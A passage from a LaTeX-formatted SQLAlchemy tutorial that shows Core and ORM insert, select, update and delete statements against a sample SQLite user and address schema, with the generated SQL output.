\subsubsection{Example: Updating Data with
ORM}\label{example-updating-data-with-orm}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Update data using ORM}
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ update(User).where(User.name }\OperatorTok{==} \StringTok{"sandy"}\NormalTok{).values(fullname}\OperatorTok{=}\StringTok{"Sandra Cheeks"}\NormalTok{)}
\NormalTok{    session.execute(stmt)}
\NormalTok{    session.commit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{Example: Deleting Data with
ORM}\label{example-deleting-data-with-orm}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Delete data using ORM}
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
\NormalTok{    stmt }\OperatorTok{=}\NormalTok{ delete(User).where(User.name }\OperatorTok{==} \StringTok{"sandy"}\NormalTok{)}
\NormalTok{    session.execute(stmt)}
\NormalTok{    session.commit()}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-19}

In this tutorial, we covered the basics of creating, selecting, and
manipulating data using SQLAlchemy. We demonstrated how to use the Core
Insert, Select, Update, and Delete constructs, as well as their ORM
equivalents. Understanding these concepts allows you to effectively
manage data within your SQLAlchemy applications.

\section{Using INSERT Statements with
SQLAlchemy}\label{using-insert-statements-with-sqlalchemy}

In SQLAlchemy, whether using Core or the ORM, a SQL INSERT statement is
generated directly using the \texttt{insert()} function. This function
generates a new instance of \texttt{Insert} which represents an INSERT
statement in SQL, adding new data into a table. This tutorial will
detail how to use the Core methods for generating SQL INSERT statements
to add new rows to a table. Understanding this process is useful even
when using the ORM, as the ORM automates many of these steps.

\subsection{\texorpdfstring{The \texttt{insert()} SQL Expression
Construct}{The insert() SQL Expression Construct}}\label{the-insert-sql-expression-construct}

The \texttt{insert()} function creates an instance of the
\texttt{Insert} construct, which represents an INSERT statement in SQL.
Here's a simple example:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ create\_engine, MetaData, Table, Column, Integer, String, insert}

\CommentTok{\# Create an in{-}memory SQLite database}
\NormalTok{engine }\OperatorTok{=}\NormalTok{ create\_engine(}\StringTok{"sqlite+pysqlite:///:memory:"}\NormalTok{, echo}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\NormalTok{metadata }\OperatorTok{=}\NormalTok{ MetaData()}

\CommentTok{\# Define a user\_account table}
\NormalTok{user\_table }\OperatorTok{=}\NormalTok{ Table(}
    \StringTok{"user\_account"}\NormalTok{, metadata,}
\NormalTok{    Column(}\StringTok{"id"}\NormalTok{, Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"name"}\NormalTok{, String(}\DecValTok{30}\NormalTok{)),}
\NormalTok{    Column(}\StringTok{"fullname"}\NormalTok{, String)}
\NormalTok{)}

\CommentTok{\# Create the table in the database}
\NormalTok{metadata.create\_all(engine)}

\CommentTok{\# Create an INSERT statement}
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ insert(user\_table).values(name}\OperatorTok{=}\StringTok{"spongebob"}\NormalTok{, fullname}\OperatorTok{=}\StringTok{"Spongebob Squarepants"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
INSERT INTO user_account (name, fullname) VALUES (:name, :fullname)
\end{verbatim}

The \texttt{stmt} variable is an instance of \texttt{Insert}. The
stringified form shows the general form of the SQL being produced. The
statement is parameterized, meaning it uses placeholders for the values
to be inserted.

\subsection{Executing the Statement}\label{executing-the-statement}

To execute the statement and insert data into the \texttt{user\_table},
we use a connection object:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(stmt)}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

This will insert the row into the \texttt{user\_table}. The SQL and the
parameters used will be logged:

\begin{verbatim}
BEGIN (implicit)
INSERT INTO user_account (name, fullname) VALUES (?, ?)
[...] ('spongebob', 'Spongebob Squarepants')
COMMIT
\end{verbatim}

To get the primary key of the inserted row:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(result.inserted\_primary\_key)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
(1,)
\end{verbatim}

\subsection{Automatic VALUES Clause}\label{automatic-values-clause}

If we don't use \texttt{Insert.values()} and just print an ``empty''
statement, it will include all columns in the table:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(insert(user\_table))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
INSERT INTO user_account (id, name, fullname) VALUES (:id, :name, :fullname)
\end{verbatim}

When executing an empty \texttt{Insert} construct, the actual columns
used in the INSERT are determined by the parameters passed to the
\texttt{Connection.execute()} method:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(}
\NormalTok{        insert(user\_table),}
\NormalTok{        [}
\NormalTok{            \{}\StringTok{"name"}\NormalTok{: }\StringTok{"sandy"}\NormalTok{, }\StringTok{"fullname"}\NormalTok{: }\StringTok{"Sandy Cheeks"}\NormalTok{\},}
\NormalTok{            \{}\StringTok{"name"}\NormalTok{: }\StringTok{"patrick"}\NormalTok{, }\StringTok{"fullname"}\NormalTok{: }\StringTok{"Patrick Star"}\NormalTok{\}}
\NormalTok{        ]}
\NormalTok{    )}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
INSERT INTO user_account (name, fullname) VALUES (?, ?)
[...] [('sandy', 'Sandy Cheeks'), ('patrick', 'Patrick Star')]
COMMIT
\end{verbatim}

\subsection{INSERT with Subqueries}\label{insert-with-subqueries}

For more complex INSERTs, you can use subqueries. Here's an example that
uses a scalar subquery to insert data into the \texttt{address\_table}
based on data in the \texttt{user\_table}:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ select, bindparam}

\CommentTok{\# Define the address table}
\NormalTok{address\_table }\OperatorTok{=}\NormalTok{ Table(}
    \StringTok{"address"}\NormalTok{, metadata,}
\NormalTok{    Column(}\StringTok{"id"}\NormalTok{, Integer, primary\_key}\OperatorTok{=}\VariableTok{True}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"user\_id"}\NormalTok{, ForeignKey(}\StringTok{"user\_account.id"}\NormalTok{), nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{),}
\NormalTok{    Column(}\StringTok{"email\_address"}\NormalTok{, String, nullable}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\NormalTok{)}

\CommentTok{\# Create the table in the database}
\NormalTok{metadata.create\_all(engine)}

\CommentTok{\# Scalar subquery}
\NormalTok{scalar\_subq }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    select(user\_table.c.}\BuiltInTok{id}\NormalTok{)}
\NormalTok{    .where(user\_table.c.name }\OperatorTok{==}\NormalTok{ bindparam(}\StringTok{"username"}\NormalTok{))}
\NormalTok{    .scalar\_subquery()}
\NormalTok{)}

\CommentTok{\# Insert into address table using subquery}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(}
\NormalTok{        insert(address\_table).values(user\_id}\OperatorTok{=}\NormalTok{scalar\_subq),}
\NormalTok{        [}
\NormalTok{            \{}\StringTok{"username"}\NormalTok{: }\StringTok{"spongebob"}\NormalTok{, }\StringTok{"email\_address"}\NormalTok{: }\StringTok{"spongebob@sqlalchemy.org"}\NormalTok{\},}
\NormalTok{            \{}\StringTok{"username"}\NormalTok{: }\StringTok{"sandy"}\NormalTok{, }\StringTok{"email\_address"}\NormalTok{: }\StringTok{"sandy@sqlalchemy.org"}\NormalTok{\},}
\NormalTok{            \{}\StringTok{"username"}\NormalTok{: }\StringTok{"sandy"}\NormalTok{, }\StringTok{"email\_address"}\NormalTok{: }\StringTok{"sandy@squirrelpower.org"}\NormalTok{\}}
\NormalTok{        ]}
\NormalTok{    )}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
INSERT INTO address (user_id, email_address) VALUES ((SELECT user_account.id FROM user_account WHERE user_account.name = ?), ?)
[...] [('spongebob', 'spongebob@sqlalchemy.org'), ('sandy', 'sandy@sqlalchemy.org'), ('sandy', 'sandy@squirrelpower.org')]
COMMIT
\end{verbatim}

\subsection{INSERT with RETURNING}\label{insert-with-returning}

For databases that support the RETURNING clause, you can use it to
return values from the inserted row:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{insert\_stmt }\OperatorTok{=}\NormalTok{ insert(address\_table).returning(address\_table.c.}\BuiltInTok{id}\NormalTok{, address\_table.c.email\_address)}
\BuiltInTok{print}\NormalTok{(insert\_stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
INSERT INTO address (id, user_id, email_address) VALUES (:id, :user_id, :email_address) RETURNING address.id, address.email_address
\end{verbatim}

To execute the statement and get the returned values:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(insert\_stmt)}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

\subsection{INSERT from SELECT}\label{insert-from-select}

You can also insert rows based on a SELECT statement using the
\texttt{Insert.from\_select()} method:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{select\_stmt }\OperatorTok{=}\NormalTok{ select(user\_table.c.}\BuiltInTok{id}\NormalTok{, user\_table.c.name }\OperatorTok{+} \StringTok{"@aol.com"}\NormalTok{)}
\NormalTok{insert\_stmt }\OperatorTok{=}\NormalTok{ insert(address\_table).from\_select([}\StringTok{"user\_id"}\NormalTok{, }\StringTok{"email\_address"}\NormalTok{], select\_stmt)}
\BuiltInTok{print}\NormalTok{(insert\_stmt)}

\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(insert\_stmt)}
\NormalTok{    conn.commit()}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
INSERT INTO address (user_id, email_address) SELECT user_account.id, user_account.name || :name_1 AS anon_1 FROM user_account
\end{verbatim}

\subsection{Conclusion}\label{conclusion-20}

This tutorial covered the basics of using the \texttt{insert()} function
in SQLAlchemy to create SQL INSERT statements and add data to tables. We
explored various ways to insert data, including basic inserts, inserts
with subqueries, using the RETURNING clause, and inserting data from a
SELECT statement. Understanding these concepts is essential for
effective data manipulation in SQLAlchemy applications.

\section{Using SELECT Statements with
SQLAlchemy}\label{using-select-statements-with-sqlalchemy}

The \texttt{select()} function in SQLAlchemy generates a \texttt{Select}
construct used for all SELECT queries. When passed to methods like
\texttt{Connection.execute()} in Core and \texttt{Session.execute()} in
ORM, a SELECT statement is emitted in the current transaction and the
result rows are available via the returned \texttt{Result} object.

\subsection{\texorpdfstring{The \texttt{select()} SQL Expression
Construct}{The select() SQL Expression Construct}}\label{the-select-sql-expression-construct}

The \texttt{select()} construct builds a SELECT statement in a
generative manner, where each method builds more state onto the object.
It can be stringified to see the SQL being generated:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ select}

\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(user\_table).where(user\_table.c.name }\OperatorTok{==} \StringTok{"spongebob"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
WHERE user_account.name = :name_1
\end{verbatim}

To execute the statement and fetch the results:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ conn.execute(stmt):}
        \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
WHERE user_account.name = ?
[...] ('spongebob',)
(1, 'spongebob', 'Spongebob Squarepants')
ROLLBACK
\end{verbatim}

When using the ORM, a \texttt{select()} construct composed against ORM
entities can be executed using the \texttt{Session.execute()} method on
the \texttt{Session}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(User).where(User.name }\OperatorTok{==} \StringTok{"spongebob"}\NormalTok{)}
\ControlFlowTok{with}\NormalTok{ Session(engine) }\ImportTok{as}\NormalTok{ session:}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ session.execute(stmt):}
        \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
WHERE user_account.name = ?
[...] ('spongebob',)
(User(id=1, name='spongebob', fullname='Spongebob Squarepants'),)
ROLLBACK
\end{verbatim}

\subsection{Setting the COLUMNS and FROM
Clause}\label{setting-the-columns-and-from-clause}

The \texttt{select()} function can accept positional elements
representing any number of \texttt{Column} and/or \texttt{Table}
expressions:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(user\_table))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
\end{verbatim}

Selecting specific columns:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(user\_table.c.name, user\_table.c.fullname))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.name, user_account.fullname
FROM user_account
\end{verbatim}

\subsection{Selecting ORM Entities and
Columns}\label{selecting-orm-entities-and-columns}

Selecting from ORM entities works similarly to selecting from tables.
Here's an example:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(User))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
\end{verbatim}

When executing this statement with the ORM, the result rows contain
instances of the \texttt{User} class:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{row }\OperatorTok{=}\NormalTok{ session.execute(select(User)).first()}
\BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
(User(id=1, name='spongebob', fullname='Spongebob Squarepants'),)
\end{verbatim}

To get the first element directly:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{user }\OperatorTok{=}\NormalTok{ session.scalars(select(User)).first()}
\BuiltInTok{print}\NormalTok{(user)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
User(id=1, name='spongebob', fullname='Spongebob Squarepants')
\end{verbatim}

\subsection{The WHERE Clause}\label{the-where-clause}

SQLAlchemy allows composing SQL expressions using standard Python
operators:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(user\_table.c.name }\OperatorTok{==} \StringTok{"squidward"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
user_account.name = :name_1
\end{verbatim}

Using these expressions in the \texttt{WHERE} clause:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(user\_table).where(user\_table.c.name }\OperatorTok{==} \StringTok{"squidward"}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
WHERE user_account.name = :name_1
\end{verbatim}

Combining multiple expressions with \texttt{AND}:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(address\_table.c.email\_address).where(user\_table.c.name }\OperatorTok{==} \StringTok{"squidward"}\NormalTok{).where(address\_table.c.user\_id }\OperatorTok{==}\NormalTok{ user\_table.c.}\BuiltInTok{id}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT address.email_address
FROM address, user_account
WHERE user_account.name = :name_1 AND address.user_id = user_account.id
\end{verbatim}

\subsection{Explicit FROM Clauses and
JOINs}\label{explicit-from-clauses-and-joins}

The \texttt{FROM} clause can be inferred from the columns selected or
set explicitly using \texttt{select\_from()}:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(user\_table.c.name).select\_from(user\_table))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.name
FROM user_account
\end{verbatim}

Joining tables:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(user\_table.c.name, address\_table.c.email\_address).join(address\_table))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.name, address.email_address
FROM user_account JOIN address ON user_account.id = address.user_id
\end{verbatim}

\subsection{ORDER BY, GROUP BY, HAVING}\label{order-by-group-by-having}

Ordering results:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(select(user\_table).order\_by(user\_table.c.name))}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.id, user_account.name, user_account.fullname
FROM user_account
ORDER BY user_account.name
\end{verbatim}

Grouping results:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(User.name, func.count(Address.}\BuiltInTok{id}\NormalTok{).label(}\StringTok{"count"}\NormalTok{)).join(Address).group\_by(User.name).having(func.count(Address.}\BuiltInTok{id}\NormalTok{) }\OperatorTok{\textgreater{}} \DecValTok{1}\NormalTok{)}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(stmt)}
    \BuiltInTok{print}\NormalTok{(result.}\BuiltInTok{all}\NormalTok{())}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
SELECT user_account.name, count(address.id) AS count
FROM user_account JOIN address ON user_account.id = address.user_id GROUP BY user_account.name
HAVING count(address.id) > ?
[...] (1,)
[('sandy', 2)]
ROLLBACK
\end{verbatim}

\subsection{Subqueries and CTEs}\label{subqueries-and-ctes}

Creating and using subqueries:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{subq }\OperatorTok{=}\NormalTok{ select(func.count(address\_table.c.}\BuiltInTok{id}\NormalTok{).label(}\StringTok{"count"}\NormalTok{), address\_table.c.user\_id).group\_by(address\_table.c.user\_id).subquery()}
\BuiltInTok{print}\NormalTok{(subq)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT count(address.id) AS count, address.user_id
FROM address GROUP BY address.user_id
\end{verbatim}

Using subqueries in a larger \texttt{SELECT}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(user\_table.c.name, user\_table.c.fullname, subq.c.count).join\_from(user\_table, subq)}
\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
SELECT user_account.name, user_account.fullname, anon_1.count
FROM user_account JOIN (SELECT count(address.id) AS count, address.user_id
FROM address GROUP BY address.user_id) AS anon_1 ON user_account.id = anon_1.user_id
\end{verbatim}

Using CTEs (Common Table Expressions):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{cte\_obj }\OperatorTok{=}\NormalTok{ select(func.count(address\_table.c.}\BuiltInTok{id}\NormalTok{).label(}\StringTok{"count"}\NormalTok{), address\_table.c.user\_id).group\_by(address\_table.c.user\_id).cte()}
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(user\_table.c.name, user\_table.c.fullname, cte\_obj.c.count).join\_from(user\_table, cte\_obj)}
\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
WITH anon_1 AS
(SELECT count(address.id) AS count, address.user_id AS user_id
FROM address GROUP BY address.user_id)
 SELECT user_account.name, user_account.fullname, anon_1.count
FROM user_account JOIN anon_1 ON user_account.id = anon_1.user_id
\end{verbatim}

\subsection{EXISTS Subqueries}\label{exists-subqueries}

Using EXISTS:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{subq }\OperatorTok{=}\NormalTok{ select(func.count(address\_table.c.}\BuiltInTok{id}\NormalTok{)).where(user\_table.c.}\BuiltInTok{id} \OperatorTok{==}\NormalTok{ address\_table.c.user\_id).group\_by(address\_table.c.user\_id).having(func.count(address\_table.c.}\BuiltInTok{id}\NormalTok{) }\OperatorTok{\textgreater{}} \DecValTok{1}\NormalTok{).exists()}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(select(user\_table.c.name).where(subq))}
    \BuiltInTok{print}\NormalTok{(result.}\BuiltInTok{all}\NormalTok{())}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
SELECT user_account.name
FROM user_account
WHERE EXISTS (SELECT count(address.id) AS count_1
FROM address
WHERE user_account.id = address.user_id GROUP BY address.user_id
HAVING count(address.id) > ?)
[...] (1,)
[('sandy',)]
ROLLBACK
\end{verbatim}

\subsection{Working with SQL
Functions}\label{working-with-sql-functions}

Using SQL functions:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ func}

\NormalTok{stmt }\OperatorTok{=}\NormalTok{ select(func.count()).select\_from(user\_table)}
\ControlFlowTok{with}\NormalTok{ engine.}\ExtensionTok{connect}\NormalTok{() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ conn.execute(stmt)}
    \BuiltInTok{print}\NormalTok{(result.}\BuiltInTok{all}\NormalTok{())}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
SELECT count(*) AS count_1
FROM user_account
[...] ()
[(3,)]
ROLLBACK
\end{verbatim}

\subsection{Conclusion}\label{conclusion-21}

This tutorial covers the basics of using the \texttt{select()} function
in SQLAlchemy to create SQL SELECT statements and retrieve data from
tables. We explored various aspects such as setting columns, using WHERE
clauses, performing joins, and using advanced features like subqueries,
CTEs, and SQL functions. Understanding these concepts is essential for
effective querying in SQLAlchemy applications.

\section{Using UPDATE and DELETE Statements with
SQLAlchemy}\label{using-update-and-delete-statements-with-sqlalchemy}

So far, we've covered \texttt{Insert} statements to get data into the
database and \texttt{Select} statements to retrieve it. Now, we'll cover
the \texttt{Update} and \texttt{Delete} constructs, used to modify and
delete existing rows in a table. This tutorial focuses on these
constructs from a Core-centric perspective.

\subsection{\texorpdfstring{The \texttt{update()} SQL Expression
Construct}{The update() SQL Expression Construct}}\label{the-update-sql-expression-construct}

The \texttt{update()} function generates a new instance of
\texttt{Update}, representing an SQL \texttt{UPDATE} statement to modify
existing data in a table.

A basic \texttt{UPDATE} statement:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ update}

\NormalTok{stmt }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    update(user\_table)}
\NormalTok{    .where(user\_table.c.name }\OperatorTok{==} \StringTok{"patrick"}\NormalTok{)}
\NormalTok{    .values(fullname}\OperatorTok{=}\StringTok{"Patrick the Star"}\NormalTok{)}
\NormalTok{)}
\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
UPDATE user_account SET fullname=:fullname WHERE user_account.name = :name_1
\end{verbatim}

The \texttt{Update.values()} method controls the \texttt{SET} elements
of the \texttt{UPDATE} statement. You can pass parameters using the
column names as keyword arguments.

\subsubsection{Using Expressions in
UPDATE}\label{using-expressions-in-update}

You can use column expressions within the \texttt{SET} clause:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{stmt }\OperatorTok{=}\NormalTok{ update(user\_table).values(fullname}\OperatorTok{=}\StringTok{"Username: "} \OperatorTok{+}\NormalTok{ user\_table.c.name)}
\BuiltInTok{print}\NormalTok{(stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
UPDATE user_account SET fullname=(:name_1 || user_account.name)
\end{verbatim}

\subsubsection{Executing the Statement with Multiple Parameter
Sets}\label{executing-the-statement-with-multiple-parameter-sets}

To support multiple parameter sets with the same statement, use the
\texttt{bindparam()} construct:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ bindparam}

\NormalTok{stmt }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    update(user\_table)}
\NormalTok{    .where(user\_table.c.name }\OperatorTok{==}\NormalTok{ bindparam(}\StringTok{"oldname"}\NormalTok{))}
\NormalTok{    .values(name}\OperatorTok{=}\NormalTok{bindparam(}\StringTok{"newname"}\NormalTok{))}
\NormalTok{)}
\ControlFlowTok{with}\NormalTok{ engine.begin() }\ImportTok{as}\NormalTok{ conn:}
\NormalTok{    conn.execute(}
\NormalTok{        stmt,}
\NormalTok{        [}
\NormalTok{            \{}\StringTok{"oldname"}\NormalTok{: }\StringTok{"jack"}\NormalTok{, }\StringTok{"newname"}\NormalTok{: }\StringTok{"ed"}\NormalTok{\},}
\NormalTok{            \{}\StringTok{"oldname"}\NormalTok{: }\StringTok{"wendy"}\NormalTok{, }\StringTok{"newname"}\NormalTok{: }\StringTok{"mary"}\NormalTok{\},}
\NormalTok{            \{}\StringTok{"oldname"}\NormalTok{: }\StringTok{"jim"}\NormalTok{, }\StringTok{"newname"}\NormalTok{: }\StringTok{"jake"}\NormalTok{\},}
\NormalTok{        ],}
\NormalTok{    )}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
BEGIN (implicit)
UPDATE user_account SET name=? WHERE user_account.name = ?
[...] [('ed', 'jack'), ('mary', 'wendy'), ('jake', 'jim')]
COMMIT
\end{verbatim}

\subsection{Advanced UPDATE
Techniques}\label{advanced-update-techniques}

\subsubsection{Correlated Updates}\label{correlated-updates}

An \texttt{UPDATE} statement can use rows from other tables by employing
a correlated subquery:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{scalar\_subq }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    select(address\_table.c.email\_address)}
\NormalTok{    .where(address\_table.c.user\_id }\OperatorTok{==}\NormalTok{ user\_table.c.}\BuiltInTok{id}\NormalTok{)}
\NormalTok{    .order\_by(address\_table.c.}\BuiltInTok{id}\NormalTok{)}
\NormalTok{    .limit(}\DecValTok{1}\NormalTok{)}
\NormalTok{    .scalar\_subquery()}
\NormalTok{)}
\NormalTok{update\_stmt }\OperatorTok{=}\NormalTok{ update(user\_table).values(fullname}\OperatorTok{=}\NormalTok{scalar\_subq)}
\BuiltInTok{print}\NormalTok{(update\_stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
UPDATE user_account SET fullname=(SELECT address.email_address
FROM address
WHERE address.user_id = user_account.id ORDER BY address.id
LIMIT :param_1)
\end{verbatim}

\subsubsection{UPDATE..FROM Syntax}\label{update..from-syntax}

Some databases support an \texttt{UPDATE\ FROM} syntax:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{update\_stmt }\OperatorTok{=}\NormalTok{ (}
\NormalTok{    update(user\_table)}
\NormalTok{    .where(user\_table.c.}\BuiltInTok{id} \OperatorTok{==}\NormalTok{ address\_table.c.user\_id)}
\NormalTok{    .where(address\_table.c.email\_address }\OperatorTok{==} \StringTok{"patrick@aol.com"}\NormalTok{)}
\NormalTok{    .values(fullname}\OperatorTok{=}\StringTok{"Pat"}\NormalTok{)}
\NormalTok{)}
\BuiltInTok{print}\NormalTok{(update\_stmt)}
\end{Highlighting}
\end{Shaded}

Output:

\begin{verbatim}
UPDATE user_account SET fullname=:fullname FROM address
WHERE user_account.id = address.user_id AND address.email_address = :email_address_1
\end{verbatim}

\subsection{\texorpdfstring{The \texttt{delete()} SQL Expression
Construct}{The delete() SQL Expression Construct}}\label{the-delete-sql-expression-construct}

The \texttt{delete()} function generates a new instance of
\texttt{Delete}, representing an SQL \texttt{DELETE} statement to remove
rows from a table.

A basic \texttt{DELETE} statement:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ sqlalchemy }\ImportTok{import}\NormalTok{ delete}

\NormalTok{stmt }\OperatorTok{=}\NormalTok{ delete(user\_table).where(user\_table.c.name }\OperatorTok{==} \StringTok{"patrick"}\NormalTok{)}
